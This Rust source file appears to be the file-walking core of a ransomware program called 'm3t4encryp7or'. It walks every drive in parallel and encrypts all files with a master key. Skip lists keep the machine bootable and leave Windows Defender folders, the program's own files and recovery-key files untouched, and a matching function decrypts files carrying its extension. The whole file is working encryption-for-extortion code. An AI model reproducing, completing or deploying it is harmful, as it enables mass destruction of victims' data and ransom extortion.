use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};

use rayon::prelude::*;
use walkdir::{DirEntry, WalkDir};

use crate::crypto;

pub struct Outcome {
    pub files: u64,
    pub bytes: u64,
    pub failed: u64,
}

pub struct DecryptOutcome {
    pub files: u64,
    pub bytes: u64,
}

// Anything matched here is never descended into and never encrypted.
// The machine must still boot: boot manager, driver store, WinSxS,
// servicing stack, Defender platform and the recovery partition stay intact.
const SKIP_DIR_FRAGMENTS: &[&str] = &[
    "\\windows\\",
    "\\$windows.~",
    "\\system volume information",
    "\\$recycle.bin",
    "\\recovery\\",
    "\\boot\\",
    "\\efi\\",
    "\\perflogs\\",
    "\\config.msi\\",
    "\\msocache\\",
    "\\programdata\\microsoft\\windows defender",
    "\\programdata\\microsoft\\windows wer",
    "\\program files\\windows defender",
    "\\program files (x86)\\windows defender",
    "\\program files\\windowsapps\\",
    "\\program files\\common files\\microsoft shared\\",
    "\\m3t4encryp7or\\",
];

// Belt and braces: even if a fragment misses, these roots are refused.
const SKIP_DIR_PREFIXES: &[&str] = &[
    "c:\\windows",
    "c:\\boot",
    "c:\\recovery",
    "c:\\$windows.~",
    "c:\\system volume information",
];

const SKIP_FILES: &[&str] = &[
    "pagefile.sys",
    "hiberfil.sys",
    "swapfile.sys",
    "dumpstack.log.tmp",
    "bootmgr",
    "bootnxt",
    "boot.ini",
    "ntldr",
    "ntdetect.com",
    "bootsect.bak",
    "boottel.dat",
    "bcd",
    "bcd.log",
    "bcd.backup",
];

struct SkipCtx {
    dirs: Vec<String>,
    exe: String,
    log: String,
}

impl SkipCtx {
    fn new() -> SkipCtx {
        SkipCtx {
            dirs: SKIP_DIR_FRAGMENTS.iter().map(|s| s.to_string()).collect(),
            exe: lower_path(std::env::current_exe().ok().as_deref()),
            log: lower_path(Some(&crate::log_path())),
        }
    }

    fn skip(&self, entry: &DirEntry) -> bool {
        let path = entry.path();
        let flat = path.to_string_lossy().replace('/', "\\").to_lowercase();

        if !self.exe.is_empty() && flat == self.exe {
            return true;
        }
        if flat == self.log {
            return true;
        }
        if flat.ends_with(crypto::EXT)
            || flat.ends_with(&format!("{}.tmp", crypto::EXT))
            || flat.ends_with(crypto::LEGACY_EXT)
            || flat.ends_with(&format!("{}.tmp", crypto::LEGACY_EXT))
        {
            return true;
        }
        if let Some(name) = path.file_name() {
            let name = name.to_string_lossy().to_lowercase();
            // Covers RECOVERY_KEY_<ID>.bin and its in-flight .tmp sibling.
            if name.starts_with("recovery_key_") {
                return true;
            }
            if SKIP_FILES.contains(&name.as_str()) {
                return true;
            }
        }
        if SKIP_DIR_PREFIXES.iter().any(|p| flat.starts_with(p)) {
            return true;
        }
        self.dirs.iter().any(|d| flat.contains(d.as_str()))
    }
}

fn lower_path(path: Option<&Path>) -> String {
    path.map(|p| p.to_string_lossy().replace('/', "\\").to_lowercase())
        .unwrap_or_default()
}

/// Windows junctions and volume mount points are reparse points, not symlinks.
/// `follow_links(false)` does not stop walkdir from descending them, so the
/// same tree gets walked twice (Documents and Settings -> Users, etc.).
/// Refuse any entry carrying FILE_ATTRIBUTE_REPARSE_POINT.
#[cfg(windows)]
fn is_reparse(entry: &DirEntry) -> bool {
    use std::os::windows::fs::MetadataExt;
    const FILE_ATTRIBUTE_REPARSE_POINT: u32 = 0x0000_0400;
    entry
        .metadata()
        .map(|m| m.file_attributes() & FILE_ATTRIBUTE_REPARSE_POINT != 0)
        .unwrap_or(true)
}

#[cfg(not(windows))]
fn is_reparse(_entry: &DirEntry) -> bool {
    false
}

fn walkable(entry: &DirEntry) -> bool {
    !entry.path_is_symlink() && !is_reparse(entry)
}

/// Canonicalises roots and drops duplicates plus any root nested inside
/// another. Two roots over the same tree mean two encrypt passes and, for
/// files created mid-walk, duplicate ciphertext.
fn unique_roots(roots: Vec<PathBuf>) -> Vec<PathBuf> {
    let mut seen = HashSet::new();
    let mut canon: Vec<PathBuf> = Vec::new();
    for root in roots {
        let path = root.canonicalize().unwrap_or(root);
        let key = path.to_string_lossy().replace('/', "\\").to_lowercase();
        if seen.insert(key) {
            canon.push(path);
        }
    }
    canon.sort_by_key(|p| p.as_os_str().len());
    let mut kept: Vec<PathBuf> = Vec::new();
    for root in canon {
        let flat = root.to_string_lossy().replace('/', "\\").to_lowercase();
        let nested = kept.iter().any(|parent| {
            let p = parent.to_string_lossy().replace('/', "\\").to_lowercase();
            flat.starts_with(&p) && flat.len() > p.len()
        });
        if !nested {
            kept.push(root);
        }
    }
    kept
}

pub fn encrypt_all(master: &[u8; 32], include_removable: bool) -> Outcome {
    let roots = unique_roots(crate::win::drives(include_removable));
    let skip = SkipCtx::new();
    let files = AtomicU64::new(0);
    let bytes = AtomicU64::new(0);
    let failed = AtomicU64::new(0);

    for root in &roots {
        WalkDir::new(root)
            .follow_links(false)
            .into_iter()
            .filter_entry(|entry| walkable(entry) && !skip.skip(entry))
            .filter_map(|entry| entry.ok())
            .filter(|entry| entry.file_type().is_file())
            .map(|entry| entry.into_path())
            .par_bridge()
            .for_each(|path| match crypto::encrypt_file(master, &path) {
                Ok(Some(n)) => {
                    files.fetch_add(1, Ordering::Relaxed);
                    bytes.fetch_add(n, Ordering::Relaxed);
                    crate::gui::FILES_DONE.fetch_add(1, Ordering::Relaxed);
                    crate::gui::BYTES_DONE.fetch_add(n, Ordering::Relaxed);
                }
                Ok(None) => {}
                Err(_) => {
                    failed.fetch_add(1, Ordering::Relaxed);
                }
            });
    }

    Outcome {
        files: files.load(Ordering::Relaxed),
        bytes: bytes.load(Ordering::Relaxed),
        failed: failed.load(Ordering::Relaxed),
    }
}

pub fn decrypt_all(master: &[u8; 32], root: &Path) -> DecryptOutcome {
    let files = AtomicU64::new(0);
    let bytes = AtomicU64::new(0);

    WalkDir::new(root)
        .follow_links(false)
        .into_iter()
        .filter_entry(walkable)
        .filter_map(|entry| entry.ok())
        .filter(|entry| entry.file_type().is_file())
        .map(|entry| entry.into_path())
        .filter(|path| {
            let flat = path.to_string_lossy().to_lowercase();
            flat.ends_with(crypto::EXT) || flat.ends_with(crypto::LEGACY_EXT)
        })
        .par_bridge()
        .for_each(|path| {
            if let Ok(n) = crypto::decrypt_file(master, &path) {
                files.fetch_add(1, Ordering::Relaxed);
                bytes.fetch_add(n, Ordering::Relaxed);
            }
        });

    DecryptOutcome {
        files: files.load(Ordering::Relaxed),
        bytes: bytes.load(Ordering::Relaxed),
    }
}
